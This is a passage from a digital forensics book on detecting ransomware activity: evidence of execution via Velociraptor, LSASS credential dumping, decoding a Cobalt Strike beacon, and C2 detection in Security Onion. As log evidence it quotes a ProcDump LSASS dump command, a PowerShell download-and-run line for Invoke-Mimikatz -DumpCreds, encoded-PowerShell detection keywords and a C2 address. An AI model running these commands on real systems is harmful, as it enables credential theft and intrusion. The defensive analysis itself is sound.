<div class="IMG---Figure" id="_idContainer301">
<span class="koboSpan" id="kobo.242.1"><img alt="Figure 15.13 – Velociraptor evidence collection " src="image/B18571_15_013.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.243.1">Figure 15.13 – Velociraptor evidence collection</span></p>
<p><span class="koboSpan" id="kobo.244.1">Search for </span><strong class="source-inline"><span class="koboSpan" id="kobo.245.1">evidence execution</span></strong><span class="koboSpan" id="kobo.246.1"> and </span><span class="No-Break"><span class="koboSpan" id="kobo.247.1">select </span></span><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.248.1">Windows.Analysis.EvidenceOfExecution</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.249.1">:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer302">
<span class="koboSpan" id="kobo.250.1"><img alt="Figure 15.14 – Velociraptor – Select Artifacts to collect " src="image/B18571_15_014.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.251.1">Figure 15.14 – Velociraptor – Select Artifacts to collect</span></p>
<p><span class="koboSpan" id="kobo.252.1">This evidence collection leverages several different sources to show evidence of execution. </span><span class="koboSpan" id="kobo.252.2">Review </span><a id="_idIndexMarker1309"/><span class="koboSpan" id="kobo.253.1">the parameters and then click </span><strong class="bold"><span class="koboSpan" id="kobo.254.1">Launch</span></strong><span class="koboSpan" id="kobo.255.1">. </span><span class="koboSpan" id="kobo.255.2">Once the collection is complete, select </span><strong class="bold"><span class="koboSpan" id="kobo.256.1">Download Results</span></strong><span class="koboSpan" id="kobo.257.1"> and select </span><strong class="bold"><span class="koboSpan" id="kobo.258.1">Prepare Collection Report</span></strong><span class="koboSpan" id="kobo.259.1">. </span><span class="koboSpan" id="kobo.259.2">A report will appear in the </span><strong class="bold"><span class="koboSpan" id="kobo.260.1">Available </span></strong><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.261.1">Downloads</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.262.1"> section:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer303">
<span class="koboSpan" id="kobo.263.1"><img alt="Figure 15.15 – Results " src="image/B18571_15_015.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.264.1">Figure 15.15 – Results</span></p>
<p><span class="koboSpan" id="kobo.265.1">From here, click on the report. </span><span class="koboSpan" id="kobo.265.2">This will download an HTML file that contains the output of the evidence collection. </span><span class="koboSpan" id="kobo.265.3">In the Prefetch view of the report, we can see that Rundll32 was executed </span><span class="No-Break"><span class="koboSpan" id="kobo.266.1">on 20220908T15:50:14Z:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer304">
<span class="koboSpan" id="kobo.267.1"><img alt="Figure 15.16 – RunDll32 Prefetch entry " src="image/B18571_15_016.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.268.1">Figure 15.16 – RunDll32 Prefetch entry</span></p>
<p><span class="koboSpan" id="kobo.269.1">Scrolling through </span><a id="_idIndexMarker1310"/><span class="koboSpan" id="kobo.270.1">the additional results, we can see that in addition to what appear to be legitimate DLL files executed out of the </span><strong class="source-inline"><span class="koboSpan" id="kobo.271.1">System32</span></strong><span class="koboSpan" id="kobo.272.1"> directory, there is an entry that is executed out of the </span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.273.1">TEMP</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.274.1"> directory:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer305">
<span class="koboSpan" id="kobo.275.1"><img alt="Figure 15.17 – RunDLL32 Prefetch entry details " src="image/B18571_15_017.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.276.1">Figure 15.17 – RunDLL32 Prefetch entry details</span></p>
<p><span class="koboSpan" id="kobo.277.1">Reviewing the RunDLL32 and associated DLLs executed is an excellent way to find evidence of malware execution. </span><span class="koboSpan" id="kobo.277.2">Given the location now, the analyst can then retrieve the file and send it off for </span><span class="No-Break"><span class="koboSpan" id="kobo.278.1">malware analysis.</span></span></p>
<p><span class="koboSpan" id="kobo.279.1">The process of establishing the initial foothold can be a combination of scripted file execution and human interaction. </span><span class="koboSpan" id="kobo.279.2">Next, we will look at credential access or theft, where the threat actors</span><a id="_idIndexMarker1311"/><span class="koboSpan" id="kobo.280.1"> attempt to gain access to legitimate credentials necessary to carry out the rest of </span><span class="No-Break"><span class="koboSpan" id="kobo.281.1">their attack.</span></span></p>
<h1 id="_idParaDest-264"><a id="_idTextAnchor271"/><span class="koboSpan" id="kobo.282.1">Discovering credential access and theft</span></h1>
<p><span class="koboSpan" id="kobo.283.1">One key vulnerability </span><a id="_idIndexMarker1312"/><span class="koboSpan" id="kobo.284.1">that ransomware threat actors will often leverage is the way that the Windows OS manages credentials within memory. </span><span class="koboSpan" id="kobo.284.2">Credentials and their associated password hashes are managed by the </span><strong class="bold"><span class="koboSpan" id="kobo.285.1">Local Security Authority Subsystem Service</span></strong><span class="koboSpan" id="kobo.286.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.287.1">LSASS</span></strong><span class="koboSpan" id="kobo.288.1">). </span><span class="koboSpan" id="kobo.288.2">This process, which runs in memory, contains the credentials of user accounts that have logged into or are currently logged into the system. </span><span class="koboSpan" id="kobo.288.3">In addition, Kerberos authentication tickets can be on the system within this process’ address space. </span><span class="koboSpan" id="kobo.288.4">Because of its role in managing credentials, LSASS is a high-value target for ransomware </span><span class="No-Break"><span class="koboSpan" id="kobo.289.1">threat actors.</span></span></p>
<p><span class="koboSpan" id="kobo.290.1">The MITRE ATT&amp;CK framework contains a full list of </span><strong class="bold"><span class="koboSpan" id="kobo.291.1">Credential Access [TA0006]</span></strong><span class="koboSpan" id="kobo.292.1"> techniques. </span><span class="koboSpan" id="kobo.292.2">In this case, we will look at two common techniques of OS credential dumping where the adversary accesses the LSASS process in running memory </span><strong class="bold"><span class="koboSpan" id="kobo.293.1">[T1003.001]</span></strong><span class="koboSpan" id="kobo.294.1">, along with the associated tools that are very common in ransomware attacks. </span><span class="koboSpan" id="kobo.294.2">In both cases, the tools and techniques described involve commonly available tools and can be executed </span><span class="No-Break"><span class="koboSpan" id="kobo.295.1">with easy.</span></span></p>
<h2 id="_idParaDest-265"><a id="_idTextAnchor272"/><span class="koboSpan" id="kobo.296.1">ProcDump</span></h2>
<p><span class="koboSpan" id="kobo.297.1">The first </span><a id="_idIndexMarker1313"/><span class="koboSpan" id="kobo.298.1">of the techniques involves the </span><a id="_idIndexMarker1314"/><span class="koboSpan" id="kobo.299.1">use of the Microsoft Windows Sysinternals tool ProcDump. </span><span class="koboSpan" id="kobo.299.2">In this case, the threat actor either utilizes a local copy of this tool or transfers it to the victim system for execution. </span><span class="koboSpan" id="kobo.299.3">From here, ProcDump is executed against the LSASS process using the command line, </span><span class="No-Break"><span class="koboSpan" id="kobo.300.1">like so:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.301.1">
C:\Users\Jsmith\Desktop&gt;procdump.exe -ma lsass.exe dump.dmp</span></pre>
<p><span class="koboSpan" id="kobo.302.1">From here, the threat actor can transfer the dump file and extract the password hashes </span><span class="No-Break"><span class="koboSpan" id="kobo.303.1">for cracking.</span></span></p>
<p><span class="koboSpan" id="kobo.304.1">Detecting this activity is often difficult if controls such as EDR tools or SIEM are not specifically looking for this activity. </span><span class="koboSpan" id="kobo.304.2">From a detective control standpoint, this activity is legitimate and is used by system administrators. </span><span class="koboSpan" id="kobo.304.3">Due to the frequency of this type of activity being used by ransomware threat actors, it is sound security practice to remove ProcDump or any utility that can dump the LSASS process or detect and verify any use as </span><span class="No-Break"><span class="koboSpan" id="kobo.305.1">being legitimate.</span></span></p>
<p><span class="koboSpan" id="kobo.306.1">The best </span><a id="_idIndexMarker1315"/><span class="koboSpan" id="kobo.307.1">location to find evidence of</span><a id="_idIndexMarker1316"/><span class="koboSpan" id="kobo.308.1"> the use of ProcDump is within the application execution, which we discussed in the previous section. </span><span class="koboSpan" id="kobo.308.2">Prefetch files that show the execution of ProcDump help us find the time and location of the execution. </span><span class="koboSpan" id="kobo.308.3">Another option for organizations that have enhanced Sysmon logging is to look for </span><strong class="bold"><span class="koboSpan" id="kobo.309.1">Type 1: Process Create</span></strong><span class="koboSpan" id="kobo.310.1"> entries, such as the one </span><span class="No-Break"><span class="koboSpan" id="kobo.311.1">shown here:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer306">
<span class="koboSpan" id="kobo.312.1"><img alt="Figure 15.18 – ProcDump Sysmon entry " src="image/B18571_15_018.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.313.1">Figure 15.18 – ProcDump Sysmon entry</span></p>
<p><span class="koboSpan" id="kobo.314.1">Within the</span><a id="_idIndexMarker1317"/><span class="koboSpan" id="kobo.315.1"> log </span><a id="_idIndexMarker1318"/><span class="koboSpan" id="kobo.316.1">entry, the following is the key data point to determine if credentials have </span><span class="No-Break"><span class="koboSpan" id="kobo.317.1">been accessed:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.318.1">
ParentCommandLine: C:\AtomicRedTeam\Atomics\T1003.001\procdump.exe  -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp</span></pre>
<p><span class="koboSpan" id="kobo.319.1">In the output, we can see that the threat actor executed ProcDump against the LSASS process and placed the output in the </span><strong class="source-inline"><span class="koboSpan" id="kobo.320.1">C:\Windows\Temp</span></strong><span class="koboSpan" id="kobo.321.1"> directory for later exfiltration. </span><span class="koboSpan" id="kobo.321.2">This is a good use case for the enhanced logging of systems and detecting the use </span><a id="_idIndexMarker1319"/><span class="No-Break"><span class="koboSpan" id="kobo.322.1">of</span></span><span class="No-Break"><a id="_idIndexMarker1320"/></span><span class="No-Break"><span class="koboSpan" id="kobo.323.1"> ProcDump.</span></span></p>
<h2 id="_idParaDest-266"><a id="_idTextAnchor273"/><span class="koboSpan" id="kobo.324.1">Mimikatz</span></h2>
<p><span class="koboSpan" id="kobo.325.1">In </span><a href="B18571_14.xhtml#_idTextAnchor239"><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.326.1">Chapter 14</span></em></span></a><em class="italic"><span class="koboSpan" id="kobo.327.1">,</span></em><span class="koboSpan" id="kobo.328.1"> we </span><a id="_idIndexMarker1321"/><span class="koboSpan" id="kobo.329.1">examined the tool Mimikatz. </span><span class="koboSpan" id="kobo.329.2">Mimikatz is </span><a id="_idIndexMarker1322"/><span class="koboSpan" id="kobo.330.1">another favorite tool of threat actors due to its ease of use and that it is built into a wide variety of post-exploitation frameworks. </span><span class="koboSpan" id="kobo.330.2">When integrated into tools such as Cobalt Strike or PowerSploit, the tool can be in memory without us having to write any files to the disk. </span><span class="koboSpan" id="kobo.330.3">This makes looking for trace evidence difficult, but </span><span class="No-Break"><span class="koboSpan" id="kobo.331.1">not impossible.</span></span></p>
<p><span class="koboSpan" id="kobo.332.1">For example, the exploitation tool PowerSploit, available on GitHub at </span><a href="https://github.com/PowerShellMafia/PowerSploit"><span class="koboSpan" id="kobo.333.1">https://github.com/PowerShellMafia/PowerSploit</span></a><span class="koboSpan" id="kobo.334.1">, has a module called </span><strong class="source-inline"><span class="koboSpan" id="kobo.335.1">Invoke-Mimikatz</span></strong><span class="koboSpan" id="kobo.336.1">. </span><span class="koboSpan" id="kobo.336.2">While the tool bypasses writing a binary to the disk and executing it, there are traces within the PowerShell log, specifically Event 403, that will show the command execution, as shown in the </span><span class="No-Break"><span class="koboSpan" id="kobo.337.1">following screenshot:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer307">
<span class="koboSpan" id="kobo.338.1"><img alt="Figure 15.19 – Mimikatz PowerSploit entry " src="image/B18571_15_019.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.339.1">Figure 15.19 – Mimikatz PowerSploit entry</span></p>
<p><span class="koboSpan" id="kobo.340.1">Within the </span><a id="_idIndexMarker1323"/><span class="koboSpan" id="kobo.341.1">log</span><a id="_idIndexMarker1324"/><span class="koboSpan" id="kobo.342.1"> entry is the following key data point </span><span class="No-Break"><span class="koboSpan" id="kobo.343.1">of interest:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.344.1">
HostApplication=powershell.exe &amp; {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds}</span></pre>
<p><span class="koboSpan" id="kobo.345.1">This provides the analyst with definitive proof that the credential hashes have been accessed. </span><span class="koboSpan" id="kobo.345.2">In the case of seeing the use of Mimikatz or ProcDump, it is best practice to assume that the credentials or Kerberos authentication mechanisms on that system have been compromised. </span><span class="koboSpan" id="kobo.345.3">It is therefore advisable that a password reset, as discussed in </span><a href="B18571_16.xhtml#_idTextAnchor284"><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.346.1">Chapter 16</span></em></span></a><span class="koboSpan" id="kobo.347.1">, </span><span class="No-Break"><span class="koboSpan" id="kobo.348.1">be performed.</span></span></p>
<p><span class="koboSpan" id="kobo.349.1">Understanding credential access and theft is important not only from an investigation standpoint but also in recovering from such an attack. </span><span class="koboSpan" id="kobo.349.2">Uncovering the use of these tools and what</span><a id="_idIndexMarker1325"/><span class="koboSpan" id="kobo.350.1"> credentials are potentially </span><a id="_idIndexMarker1326"/><span class="koboSpan" id="kobo.351.1">compromised provides decision-makers with the data needed to make decisions about resetting or disabling user and </span><span class="No-Break"><span class="koboSpan" id="kobo.352.1">administrator passwords.</span></span></p>
<h1 id="_idParaDest-267"><a id="_idTextAnchor274"/><span class="koboSpan" id="kobo.353.1">Investigating post-exploitation frameworks</span></h1>
<p><span class="koboSpan" id="kobo.354.1">The primary </span><a id="_idIndexMarker1327"/><span class="koboSpan" id="kobo.355.1">post-exploitation framework that analysts will encounter is Cobalt Strike. </span><span class="koboSpan" id="kobo.355.2">There are other frameworks such as PowerSploit or Meterpreter that are commonly available and can be used by even the most novice threat actor. </span><span class="koboSpan" id="kobo.355.3">One primary mechanism that these exploitation frameworks utilize is encoded PowerShell scripts to establish a reverse connection back to the threat actor’s command and </span><span class="No-Break"><span class="koboSpan" id="kobo.356.1">control infrastructure.</span></span></p>
<p><span class="koboSpan" id="kobo.357.1">There are a few benefits to this approach from an adversary’s perspective. </span><span class="koboSpan" id="kobo.357.2">First, the scripts can be loaded in a variety of places to survive a reboot. </span><span class="koboSpan" id="kobo.357.3">For example, MITRE ATT&amp;CK technique </span><strong class="bold"><span class="koboSpan" id="kobo.358.1">Scheduled Task/Job: Scheduled Task [T1053.005]</span></strong><span class="koboSpan" id="kobo.359.1"> involves using the Windows OS Scheduled Task feature to execute the script at a predetermined time. </span><span class="koboSpan" id="kobo.359.2">Additionally, malicious scripts can be placed within the registry, such as in the </span><strong class="source-inline"><span class="koboSpan" id="kobo.360.1">HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span></strong> <span class="No-Break"><span class="koboSpan" id="kobo.361.1">registry key.</span></span></p>
<p><span class="koboSpan" id="kobo.362.1">The second benefit is that malicious PowerShell scripts can be executed remotely utilizing Windows OS tools such as Windows Management Instrumentation to remotely execute malicious scripts. </span><span class="koboSpan" id="kobo.362.2">Cobalt Strike uses this functionality as one of </span><span class="No-Break"><span class="koboSpan" id="kobo.363.1">its features.</span></span></p>
<p><span class="koboSpan" id="kobo.364.1">Finally, malicious scripts can often be run directly into memory without us having to put a file on the system, which would increase the chances of the script being detected. </span><span class="koboSpan" id="kobo.364.2">Executing the script remotely and in memory can bypass some </span><span class="No-Break"><span class="koboSpan" id="kobo.365.1">antivirus controls.</span></span></p>
<p><span class="koboSpan" id="kobo.366.1">In terms of locating evidence of the use of tools such as Cobalt Strike and malicious scripts, the best location is in Windows PowerShell event logs. </span><span class="koboSpan" id="kobo.366.2">Look for the execution of remote scripts with Event ID 400 and or the use of PowerShell with Event ID 600. </span><span class="koboSpan" id="kobo.366.3">An additional source is the Windows PowerShell Operational event logs, Event ID 4104. </span><span class="koboSpan" id="kobo.366.4">The following screenshot shows the content of </span><span class="No-Break"><span class="koboSpan" id="kobo.367.1">such logs:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer308">
<span class="koboSpan" id="kobo.368.1"><img alt="Figure 15.20 – Cobalt Strike PowerShell Event Log entry " src="image/B18571_15_020.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.369.1">Figure 15.20 – Cobalt Strike PowerShell Event Log entry</span></p>
<p><span class="koboSpan" id="kobo.370.1">Two key </span><a id="_idIndexMarker1328"/><span class="koboSpan" id="kobo.371.1">items </span><a id="_idIndexMarker1329"/><span class="koboSpan" id="kobo.372.1">will often stand out regarding malicious scripts. </span><span class="koboSpan" id="kobo.372.2">The first is the Base64 encoding, as seen in the preceding screenshot. </span><span class="koboSpan" id="kobo.372.3">In addition, commands such as </span><strong class="source-inline"><span class="koboSpan" id="kobo.373.1">Powershell -nop - w hidden -noni -e</span></strong><span class="koboSpan" id="kobo.374.1"> and </span><strong class="source-inline"><span class="koboSpan" id="kobo.375.1">powershell.exe -EncodedCommand</span></strong><span class="koboSpan" id="kobo.376.1"> are often red flags and can serve as keywords to search for when conducting </span><span class="No-Break"><span class="koboSpan" id="kobo.377.1">log analysis.</span></span></p>
<p><span class="koboSpan" id="kobo.378.1">To extract IOCs from these scripts, we can use the CyberChef tool that we previously used when decoding the Base64 data within the macro. </span><span class="koboSpan" id="kobo.378.2">In this case, we will decode a common Cobalt Strike script that installs a beacon on a </span><span class="No-Break"><span class="koboSpan" id="kobo.379.1">target system:</span></span></p>
<ol>
<li><span class="koboSpan" id="kobo.380.1">The first step is to simply copy the Base64 characters out of either the event logs, scheduled task, or registry. </span><span class="koboSpan" id="kobo.380.2">A good technique is to copy them to a text editor, just in</span><a id="_idIndexMarker1330"/><span class="koboSpan" id="kobo.381.1"> case you make a small error; this means you can always go back to a </span><span class="No-Break"><span class="koboSpan" id="kobo.382.1">clean output:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer309">
<span class="koboSpan" id="kobo.383.1"><img alt="Figure 15.21 – Cobalt Strike Base64-encoded script " src="image/B18571_15_021.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.384.1">Figure 15.21 – Cobalt Strike Base64-encoded script</span></p>
<ol>
<li value="2"><span class="koboSpan" id="kobo.385.1">Next, we will</span><a id="_idIndexMarker1331"/><span class="koboSpan" id="kobo.386.1"> place the encoded data into the </span><strong class="bold"><span class="koboSpan" id="kobo.387.1">Input</span></strong><span class="koboSpan" id="kobo.388.1"> field in CyberChef and use </span><strong class="bold"><span class="koboSpan" id="kobo.389.1">From </span></strong><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.390.1">Base64</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.391.1"> operations:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer310">
<span class="koboSpan" id="kobo.392.1"><img alt="Figure 15.22 – First Base64 decode " src="image/B18571_15_022.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.393.1">Figure 15.22 – First Base64 decode</span></p>
<ol>
<li value="3"><span class="koboSpan" id="kobo.394.1">What you</span><a id="_idIndexMarker1332"/><span class="koboSpan" id="kobo.395.1"> will often notice is that embedded in the encoded PowerShell script is another set of Base64-encoded characters. </span><span class="koboSpan" id="kobo.395.2">Simply repeat the process by decoding the newly </span><span class="No-Break"><span class="koboSpan" id="kobo.396.1">encoded characters:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer311">
<span class="koboSpan" id="kobo.397.1"><img alt="Figure 15.23 – Second Base64 decode " src="image/B18571_15_023.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.398.1">Figure 15.23 – Second Base64 decode</span></p>
<ol>
<li value="4"><span class="koboSpan" id="kobo.399.1">Again, there</span><a id="_idIndexMarker1333"/><span class="koboSpan" id="kobo.400.1"> is another set of Base64-encoded characters with the following text </span><span class="No-Break"><span class="koboSpan" id="kobo.401.1">preceding it:</span></span><pre class="source-code"><span class="koboSpan" id="kobo.402.1">
[Byte[]]$var_code = [System.Convert]::FromBase64String</span></pre></li>
</ol>
<p><span class="koboSpan" id="kobo.403.1">After the encoded characters, there is </span><span class="No-Break"><span class="koboSpan" id="kobo.404.1">this string:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.405.1">
for ($x = 0; $x -lt $var_code.Count; $x++) {
          $var_code[$x] = $var_code[$x] -bxor 35</span></pre>
<ol>
<li value="5"><span class="koboSpan" id="kobo.406.1">The preceding string indicates that the preceding characters are not only encoded but have been put through an XOR function. </span><span class="koboSpan" id="kobo.406.2">In this case, copy the encoded commands and place them in the input. </span><span class="koboSpan" id="kobo.406.3">Here, we will use the same </span><strong class="bold"><span class="koboSpan" id="kobo.407.1">From Base64</span></strong><span class="koboSpan" id="kobo.408.1"> operation but this time, we will add another operation that addresses the XOR function, as shown in the </span><span class="No-Break"><span class="koboSpan" id="kobo.409.1">following screenshot:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer312">
<span class="koboSpan" id="kobo.410.1"><img alt="Figure 15.24 – Base64 XOR recipe " src="image/B18571_15_024.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.411.1">Figure 15.24 – Base64 XOR recipe</span></p>
<ol>
<li value="6"><span class="koboSpan" id="kobo.412.1">This </span><a id="_idIndexMarker1334"/><span class="koboSpan" id="kobo.413.1">produces</span><a id="_idIndexMarker1335"/><span class="koboSpan" id="kobo.414.1"> the following </span><span class="No-Break"><span class="koboSpan" id="kobo.415.1">shellcode output:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer313">
<span class="koboSpan" id="kobo.416.1"><img alt="Figure 15.25 – Shellcode output " src="image/B18571_15_025.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.417.1">Figure 15.25 – Shellcode output</span></p>
<p><span class="koboSpan" id="kobo.418.1">An analysis</span><a id="_idIndexMarker1336"/><span class="koboSpan" id="kobo.419.1"> of the</span><a id="_idIndexMarker1337"/><span class="koboSpan" id="kobo.420.1"> shellcode reveals several key pieces of data. </span><span class="koboSpan" id="kobo.420.2">The first and most obvious is the IP address </span><strong class="source-inline"><span class="koboSpan" id="kobo.421.1">47.242.164.33</span></strong><span class="koboSpan" id="kobo.422.1">. </span><span class="koboSpan" id="kobo.422.2">There are also additional data points, such as the </span><strong class="source-inline"><span class="koboSpan" id="kobo.423.1">User-Agent</span></strong><span class="koboSpan" id="kobo.424.1"> string. </span><span class="koboSpan" id="kobo.424.2">Now that we have this shellcode and the associated IOCs, we can stop here, but it may be important to evaluate the shellcode independently using </span><strong class="source-inline"><span class="koboSpan" id="kobo.425.1">scdbg</span></strong><span class="koboSpan" id="kobo.426.1">, an open-source shellcode analysis application available </span><span class="No-Break"><span class="koboSpan" id="kobo.427.1">at </span></span><a href="http://sandsprite.com/blogs/index.php?uid=7&amp;pid=152"><span class="No-Break"><span class="koboSpan" id="kobo.428.1">http://sandsprite.com/blogs/index.php?uid=7&amp;pid=152</span></span></a><span class="No-Break"><span class="koboSpan" id="kobo.429.1">.</span></span></p>
<p><span class="koboSpan" id="kobo.430.1">First, use the save icon located in the </span><strong class="bold"><span class="koboSpan" id="kobo.431.1">Output</span></strong><span class="koboSpan" id="kobo.432.1"> pane in CyberChef. </span><span class="koboSpan" id="kobo.432.2">This will allow the analyst to download the file as </span><strong class="source-inline"><span class="koboSpan" id="kobo.433.1">.dat</span></strong><span class="koboSpan" id="kobo.434.1">. </span><span class="koboSpan" id="kobo.434.2">Next, download </span><strong class="source-inline"><span class="koboSpan" id="kobo.435.1">scdbg</span></strong><span class="koboSpan" id="kobo.436.1"> and uncompress the file to the desired location. </span><span class="koboSpan" id="kobo.436.2">Finally, run the following command against the </span><span class="No-Break"><span class="koboSpan" id="kobo.437.1">downloaded shellcode:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.438.1">
C:\Users\PROD-SANDBOX\Downloads\scdbg.exe -f download.dat</span></pre>
<p><span class="koboSpan" id="kobo.439.1">This will produce the </span><span class="No-Break"><span class="koboSpan" id="kobo.440.1">following output:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer314">
<span class="koboSpan" id="kobo.441.1"><img alt="Figure 15.26 – Shellcode analysis " src="image/B18571_15_026.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.442.1">Figure 15.26 – Shellcode analysis</span></p>
<p><span class="koboSpan" id="kobo.443.1">The output indicates that</span><a id="_idIndexMarker1338"/><span class="koboSpan" id="kobo.444.1"> a connection has been established with the IP address </span><strong class="source-inline"><span class="koboSpan" id="kobo.445.1">47.242.164.33</span></strong><span class="koboSpan" id="kobo.446.1"> using the destination port </span><strong class="source-inline"><span class="koboSpan" id="kobo.447.1">8083</span></strong><span class="koboSpan" id="kobo.448.1">. </span><span class="koboSpan" id="kobo.448.2">Taken in conjunction with the user agent string that we observed previously, the Cobalt Strike beacon is attempting to blend in with other internet traffic to obfuscate the </span><span class="No-Break"><span class="koboSpan" id="kobo.449.1">C2 traffic.</span></span></p>
<p><span class="koboSpan" id="kobo.450.1">Locating, extracting, and analyzing a post-exploitation script or beacon is critical as it often reveals the C2 infrastructure the threat actor is using. </span><span class="koboSpan" id="kobo.450.2">It is also critical for understanding</span><a id="_idIndexMarker1339"/><span class="koboSpan" id="kobo.451.1"> how the threat actor is maintaining control over the system and provides data for proper eradication </span><span class="No-Break"><span class="koboSpan" id="kobo.452.1">and recovery.</span></span></p>
<h1 id="_idParaDest-268"><a id="_idTextAnchor275"/><span class="koboSpan" id="kobo.453.1">Command and Control</span></h1>
<p><span class="koboSpan" id="kobo.454.1">In this case, we </span><a id="_idIndexMarker1340"/><span class="koboSpan" id="kobo.455.1">will look at traffic associated with the </span><a id="_idIndexMarker1341"/><span class="koboSpan" id="kobo.456.1">post-exploitation tool Cobalt Strike. </span><span class="koboSpan" id="kobo.456.2">This is a commonly used tool by ransomware threat actors. </span><span class="koboSpan" id="kobo.456.3">In this case, we will look at examining a full packet capture to uncover previously unidentified IOCs related to the adversary’s infrastructure. </span><span class="koboSpan" id="kobo.456.4">For this review, we will look at a packet capture related to an attack using the Squirrelwaffle loader with the Qakbot RAT and finally how to install Cobalt Strike, which is available </span><span class="No-Break"><span class="koboSpan" id="kobo.457.1">at </span></span><a href="https://www.malware-traffic-analysis.net/2021/09/22/index.html"><span class="No-Break"><span class="koboSpan" id="kobo.458.1">https://www.malware-traffic-analysis.net/2021/09/22/index.html</span></span></a><span class="No-Break"><span class="koboSpan" id="kobo.459.1">.</span></span></p>
<h2 id="_idParaDest-269"><a id="_idTextAnchor276"/><span class="koboSpan" id="kobo.460.1">Security Onion</span></h2>
<p><span class="koboSpan" id="kobo.461.1">One tool</span><a id="_idIndexMarker1342"/><span class="koboSpan" id="kobo.462.1"> that we briefly covered previously</span><a id="_idIndexMarker1343"/><span class="koboSpan" id="kobo.463.1"> is Security Onion. </span><span class="koboSpan" id="kobo.463.2">This open source intrusion detection system can aid in identifying potential command and control traffic. </span><span class="koboSpan" id="kobo.463.3">In this case, the packet capture was run against the existing rule set and Security Onion indicated several hits. </span><span class="koboSpan" id="kobo.463.4">One that is of note</span><a id="_idIndexMarker1344"/><span class="koboSpan" id="kobo.464.1"> is the </span><strong class="bold"><span class="koboSpan" id="kobo.465.1">ET MALWARE Observed Qbot Style </span></strong><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.466.1">SSL Certificate</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.467.1">:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer315">
<span class="koboSpan" id="kobo.468.1"><img alt="Figure 15.27 – Cobalt Strike Security Onion detection " src="image/B18571_15_027.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.469.1">Figure 15.27 – Cobalt Strike Security Onion detection</span></p>
<p><span class="koboSpan" id="kobo.470.1">This hit indicates that the SSL certificate matches those previously observed in conjunction with the Qbot malware. </span><span class="koboSpan" id="kobo.470.2">A further examination of the IP addresses associated with the malicious traffic indicated 27 connections with a non-standard </span><span class="No-Break"><span class="koboSpan" id="kobo.471.1">HTTP port:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer316">
<span class="koboSpan" id="kobo.472.1"><img alt="Figure 15.28 – Security Onion alert network connections " src="image/B18571_15_028.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.473.1">Figure 15.28 – Security Onion alert network connections</span></p>
